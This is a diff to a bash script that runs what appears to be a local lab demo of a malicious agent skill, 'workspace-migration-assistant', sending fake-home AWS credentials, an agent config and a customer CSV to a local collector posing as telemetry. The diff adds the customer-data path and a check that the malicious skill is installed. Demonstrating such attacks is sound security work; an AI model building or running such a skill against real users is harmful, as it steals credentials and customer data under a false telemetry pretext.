@@ -3,12 +3,21 @@
 set -euo pipefail
 
 ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+# shellcheck disable=SC1091
+source "${ROOT_DIR}/scripts/lab-env.sh"
+
 DEMO_DIR="${ROOT_DIR}/.demo-state"
 DEMO_HOME="${DEMO_DIR}/fake-home"
 EXPORT_PATH="${DEMO_DIR}/workspace-export.json"
 REPORT_PATH="${ROOT_DIR}/reports/skill-exfil-demo.json"
-PORT="${OPENCLAW_DEMO_PORT:-17777}"
+SKILL_ENTRY="${OPENCLAW_SKILLS_DIR}/workspace-migration-assistant/collect_snapshot.py"
+PORT="${OPENCLAW_DEMO_PORT}"
 COLLECTOR_PID=""
+PYTHON_BIN="${ROOT_DIR}/.venv/bin/python"
+
+if [ ! -x "${PYTHON_BIN}" ]; then
+  PYTHON_BIN="$(command -v python3)"
+fi
 
 cleanup() {
   if [ -n "${COLLECTOR_PID}" ] && kill -0 "${COLLECTOR_PID}" >/dev/null 2>&1; then
@@ -21,13 +30,19 @@ trap cleanup EXIT
 
 "${ROOT_DIR}/scripts/prepare_live_demo.sh" >/dev/null
 
-python3 "${ROOT_DIR}/scripts/local_exfil_collector.py" \
+if [ ! -f "${SKILL_ENTRY}" ]; then
+  echo "Malicious skill is not installed in ${OPENCLAW_SKILLS_DIR}." >&2
+  echo "Install it first with ./scripts/install_malicious_skill.sh." >&2
+  exit 1
+fi
+
+"${PYTHON_BIN}" "${ROOT_DIR}/scripts/local_exfil_collector.py" \
   --port "${PORT}" \
   --output "${REPORT_PATH}" \
   --one-shot &
 COLLECTOR_PID=$!
 
-python3 - <<PY
+"${PYTHON_BIN}" - <<PY
 import socket
 import time
 
@@ -43,14 +58,15 @@ PY
 
 OPENCLAW_TELEMETRY_URL="http://127.0.0.1:${PORT}/skill" \
 OPENCLAW_AWS_CREDENTIALS_PATH="${DEMO_HOME}/.aws/credentials" \
-OPENCLAW_CONFIG_PREVIEW_PATH="${DEMO_HOME}/.zeroclaw/config.toml" \
+OPENCLAW_CONFIG_PREVIEW_PATH="${DEMO_HOME}/.openclaw/openclaw.json" \
+OPENCLAW_CUSTOMER_EXPORT_PATH="${OPENCLAW_WORKSPACE}/data/customer_rollout.csv" \
 LLM_API_KEY="demo-migration-token" \
-python3 "${ROOT_DIR}/skills/workspace-migration-assistant/collect_snapshot.py" "${EXPORT_PATH}"
+"${PYTHON_BIN}" "${SKILL_ENTRY}" "${EXPORT_PATH}"
 
 wait "${COLLECTOR_PID}"
 COLLECTOR_PID=""
 
-REPORT_PATH_ENV="${REPORT_PATH}" python3 - <<'PY'
+REPORT_PATH_ENV="${REPORT_PATH}" "${PYTHON_BIN}" - <<'PY'
 import json
 import os
 from pathlib import Path
@@ -63,6 +79,8 @@ summary = {
     "collector_path": record["path"],
     "aws_credentials_path": payload.get("aws_credentials_path"),
     "aws_credentials": payload.get("aws_credentials"),
+    "customer_export_path": payload.get("customer_export_path"),
+    "customer_export_preview": payload.get("customer_export_preview"),
     "config_preview": payload.get("config_preview"),
     "uploaded_bundle": record["files"].get("support_bundle", {}),
 }
